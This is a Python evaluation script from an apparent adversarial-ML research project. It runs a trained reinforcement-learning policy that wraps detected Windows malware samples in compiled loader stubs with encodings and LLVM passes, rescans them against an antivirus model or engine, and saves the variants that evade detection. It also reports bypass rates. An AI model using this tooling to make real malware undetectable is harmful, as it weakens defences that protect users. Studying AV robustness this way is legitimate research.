#!/usr/bin/env python3
"""
Testing script for evaluating trained RL policies.

Usage:
    python test.py --av-type model --av-name avastnet --max-samples 100
"""

import os
import argparse
import time
from pathlib import Path
from typing import Dict, List, Any

from stable_baselines3 import PPO

from src.envs import TestEnv
from src.pe_utils import detect_pe_bits, get_pe_image_base, get_pe_subsystem, expand_size_of_image
from src.compiler import compile_stub_to_ir, compile_to_exe, attach_payload
from src.scanner import build_scanner


def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Test trained RL policy for AV evasion"
    )
    parser.add_argument(
        "--av-type", type=str, default="model",
        choices=["model", "engine"],
        help="Target AV type (default: model)"
    )
    parser.add_argument(
        "--av-name", type=str, default="avastnet",
        help="Target AV name (default: avastnet)"
    )
    parser.add_argument(
        "--sample-dir", type=str,
        default="data/test_samples",
        help="Directory containing test samples (default: data/test_samples)"
    )
    parser.add_argument(
        "--model-path", type=str, default=None,
        help="Path to trained model (default: policies/<av_name>_ppo)"
    )
    parser.add_argument(
        "--max-samples", type=int, default=2000,
        help="Maximum number of samples to test (default: 2000)"
    )
    return parser.parse_args()


def test_rl_policy(
    sample_dir: str,
    model_path: str,
    source_bc_32: str,
    source_bc_64: str,
    av_type: str = 'model',
    av_name: str = 'avastnet',
    max_samples: int = 100,
    delay_loop_plugin: str = None
) -> Dict[str, Any]:
    """
    Test RL policy on samples.
    
    Args:
        sample_dir: Directory containing test samples.
        model_path: Path to trained PPO model.
        source_bc_32: Path to 32-bit loader bitcode.
        source_bc_64: Path to 64-bit loader bitcode.
        av_type: Type of AV target.
        av_name: Name of AV target.
        max_samples: Maximum number of samples to test.
        delay_loop_plugin: Path to DelayLoop.so plugin.
        
    Returns:
        Dictionary containing test results.
    """
    print("=" * 60)
    print("RL Policy Testing")
    print("=" * 60)
    
    base_dir = Path("outputs") / "test" / av_name
    base_dir.mkdir(parents=True, exist_ok=True)
    output_dir = base_dir / "adversarial"
    output_dir.mkdir(exist_ok=True)
    
    # Load model
    print(f"\n[*] Loading model: {model_path}")
    env = TestEnv(source_bc_32, source_bc_64, av_name=av_name, 
                  delay_loop_plugin=delay_loop_plugin)
    model = PPO.load(model_path, env=env)
    print("  Model loaded successfully")
    
    # Initialize scanner and check online
    print(f"\n[*] Checking AV service: {av_type}:{av_name}")
    scanner = build_scanner(av_type, av_name)
    scanner.check_online()
    print(f"  {av_type}:{av_name} online")
    
    # Get samples
    sample_files = list(Path(sample_dir).glob('*'))
    sample_files = [f for f in sample_files if f.is_file()][:max_samples]
    print(f"\n[*] Test samples: {len(sample_files)}")
    
    # Results
    results = {
        'total': 0,
        'bypassed': 0,
        'original_detected': 0,
        'compile_failed': 0,
        'direct_attach_bypassed': 0,
        'details': []
    }
    
    print(f"\n{'=' * 60}")
    print("Starting test")
    print(f"{'=' * 60}\n")
    
    start_time = time.time()
    
    for i, sample_file in enumerate(sample_files, 1):
        sample_name = sample_file.name
        
        try:
            with open(sample_file, 'rb') as f:
                payload_data = f.read()
        except:
            continue
        
        results['total'] += 1
        
        # Check original detection
        orig_response = scanner.analyse_sample(payload_data)
        if orig_response['result'] == 0:
            continue
        results['original_detected'] += 1
        
        # Setup environment
        bits = detect_pe_bits(payload_data)
        image_base = get_pe_image_base(payload_data) or (0x400000 if bits == 32 else 0x140000000)
        subsystem = get_pe_subsystem(payload_data)
        
        env.set_sample(payload_data, bits)
        obs, _ = env.reset()
        
        direct_bypassed = False
        direct_exe_data = None
        temp_loader = str(env.work_dir / "temp_loader.exe")
        compiled = compile_to_exe(env.current_bc, temp_loader, bits, image_base, subsystem)
        
        if compiled:
            expand_size_of_image(temp_loader, payload_data)
            
            temp_final = str(env.work_dir / "temp_final.exe")
            attach_payload(temp_loader, payload_data, env.encoding_sequence, temp_final)
            
            with open(temp_final, 'rb') as f:
                direct_exe_data = f.read()
            
            response = scanner.analyse_sample(direct_exe_data)
            
            if response['result'] == 0:
                direct_bypassed = True
            
            # Cleanup temp files
            try:
                os.remove(temp_loader)
                os.remove(temp_final)
            except:
                pass
        
        if direct_bypassed:
            results['direct_attach_bypassed'] += 1
            results['bypassed'] += 1
            sample_base = sample_file.stem
            adv_name = f"{sample_base}_adv"
            adv_path = output_dir / adv_name
            with open(adv_path, 'wb') as f:
                f.write(direct_exe_data)
            
            if i <= 20 or i % 50 == 0:
                print(f"[{i:3d}] Direct: {sample_name[:25]:25s} "
                      f"(no pass, no encoding)")
            
            results['details'].append({
                'sample': sample_name,
                'bypassed': True,
                'direct_attach': True,
                'encoding_sequence': [],
                'passes': [],
                'steps': 0,
            })
            continue
        
        # RL inference - test each step
        bypassed = False
        final_passes = []
        success_exe_data = None
        
        for step in range(env.max_steps):
            action, _ = model.predict(obs, deterministic=True)
            obs, _, _, truncated, _ = env.step(action)
            
            final_passes = env.pass_history.copy()
            
            temp_loader = str(env.work_dir / f"temp_loader.exe")
            compiled = compile_to_exe(env.current_bc, temp_loader, bits, image_base, subsystem)
            
            if compiled:
                expand_size_of_image(temp_loader, payload_data)
                
                temp_final = str(env.work_dir / f"temp_final.exe")
                attach_payload(temp_loader, payload_data, 
                               env.encoding_sequence, temp_final)
                
                with open(temp_final, 'rb') as f:
                    exe_data = f.read()
                
                response = scanner.analyse_sample(exe_data)
                
                if response['result'] == 0:
                    bypassed = True
                    success_exe_data = exe_data
                    break
                
                # Cleanup temp files
                try:
                    os.remove(temp_loader)
                    os.remove(temp_final)
                except:
                    pass
            
            if truncated:
                break
        
        encoding_str = '+'.join(env.encoding_sequence) if env.encoding_sequence else 'none'
        pass_str = '+'.join(env.pass_history) if env.pass_history else 'none'
        
        if bypassed:
            results['bypassed'] += 1
            sample_base = sample_file.stem
            adv_name = f"{sample_base}_adv"
            adv_path = output_dir / adv_name
            with open(adv_path, 'wb') as f:
                f.write(success_exe_data)
            
            if i <= 20 or i % 50 == 0:
                print(f"[{i:3d}] Bypass: {sample_name[:25]:25s} "
                      f"(step:{step+1}, Pass:{pass_str}, Enc:{encoding_str})")
        else:
            if i <= 5:
                print(f"[{i:3d}] Failed: {sample_name[:25]:25s} "
                      f"(Pass:{pass_str}, Enc:{encoding_str})")
        
        results['details'].append({
            'sample': sample_name,
            'bypassed': bypassed,
            'direct_attach': False,
            'encoding_sequence': env.encoding_sequence.copy(),
            'passes': final_passes,
            'steps': step + 1 if bypassed else env.max_steps,
        })
        
        if i % 50 == 0:
            elapsed = time.time() - start_time
            rate = results['bypassed'] / results['original_detected'] * 100 if results['original_detected'] > 0 else 0
            print(f"\n[Progress] {i}/{len(sample_files)}, "
                  f"Success rate: {rate:.2f}%, "
                  f"Time: {elapsed:.1f}s\n")
    
    # Final statistics
    elapsed = time.time() - start_time
    
    print(f"\n{'=' * 60}")
    print("Test Complete - Final Statistics")
    print(f"{'=' * 60}")
    
    print(f"\nTotal samples: {results['total']}")
    print(f"Originally detected: {results['original_detected']}")
    print(f"Direct attach bypassed (no pass, no encoding): {results['direct_attach_bypassed']}")
    rl_bypassed = results['bypassed'] - results['direct_attach_bypassed']
    print(f"RL bypassed: {rl_bypassed}")
    print(f"Total bypassed: {results['bypassed']}")
    
    if results['original_detected'] > 0:
        direct_rate = results['direct_attach_bypassed'] / results['original_detected'] * 100
        rl_rate = rl_bypassed / results['original_detected'] * 100
        rate = results['bypassed'] / results['original_detected'] * 100
        print(f"\nDirect attach bypass rate: {direct_rate:.2f}%")
        print(f"RL bypass rate: {rl_rate:.2f}%")
        print(f"Total bypass rate: {rate:.2f}%")
    
    print(f"\nTime elapsed: {elapsed:.1f}s")
    print(f"Average per sample: {elapsed/results['total']:.2f}s" if results['total'] > 0 else "")
    
    # Encoding distribution
    encoding_counts = {}
    for d in results['details']:
        if d['bypassed']:
            enc = '+'.join(d['encoding_sequence']) if d['encoding_sequence'] else 'none'
            encoding_counts[enc] = encoding_counts.get(enc, 0) + 1
    
    if encoding_counts:
        print(f"\nEncoding distribution for successful bypasses:")
        for enc, count in sorted(encoding_counts.items(), key=lambda x: -x[1]):
            print(f"  {enc:15s}: {count:3d} ({count/results['bypassed']*100:.2f}%)")
    
    # Pass distribution
    pass_counts = {}
    for d in results['details']:
        if d['bypassed']:
            p = '+'.join(d['passes']) if d['passes'] else 'none'
            pass_counts[p] = pass_counts.get(p, 0) + 1
    
    if pass_counts:
        print(f"\nPass distribution for successful bypasses:")
        for p, count in sorted(pass_counts.items(), key=lambda x: -x[1]):
            print(f"  {p:15s}: {count:3d} ({count/results['bypassed']*100:.2f}%)")
    
    # Step distribution
    step_counts = {}
    for d in results['details']:
        if d['bypassed']:
            steps = d['steps']
            step_counts[steps] = step_counts.get(steps, 0) + 1
    
    if step_counts:
        print(f"\nStep distribution for successful bypasses:")
        for steps in sorted(step_counts.keys()):
            count = step_counts[steps]
            print(f"  {steps} steps: {count:3d} ({count/results['bypassed']*100:.2f}%)")
    
    return results


def main():
    args = parse_args()
    
    # Change to project directory
    project_dir = Path(__file__).parent
    os.chdir(project_dir)
    
    # Paths
    stub_dir = "stub"
    source_bc_32 = f"{stub_dir}/build/stub_32.bc"
    source_bc_64 = f"{stub_dir}/build/stub_64.bc"
    delay_loop_plugin = str(project_dir / "llvm" / "passes" / "DelayLoop.so")
    
    # Model path
    model_path = args.model_path or f"policies/{args.av_name}_ppo"
    
    print(f"Configuration:")
    print(f"  Sample directory: {args.sample_dir}")
    print(f"  Model: {model_path}")
    print(f"  Target AV: {args.av_type}:{args.av_name}")
    print(f"  Max samples: {args.max_samples}")
    print(f"  Working directory: outputs/test/{args.av_name}/")
    
    # Check IR files, compile if needed
    if not os.path.exists(source_bc_32):
        print(f"\nCompiling 32-bit IR...")
        if not compile_stub_to_ir(32, stub_dir):
            return
    
    if not os.path.exists(source_bc_64):
        print(f"\nCompiling 64-bit IR...")
        if not compile_stub_to_ir(64, stub_dir):
            return
    
    # Check model
    if not os.path.exists(f"{model_path}.zip"):
        print(f"\nError: Model not found: {model_path}.zip")
        print("Please train a model first using train.py")
        return
    
    # Run test
    test_rl_policy(
        args.sample_dir,
        model_path,
        source_bc_32,
        source_bc_64,
        av_type=args.av_type,
        av_name=args.av_name,
        max_samples=args.max_samples,
        delay_loop_plugin=delay_loop_plugin
    )


if __name__ == "__main__":
    main()
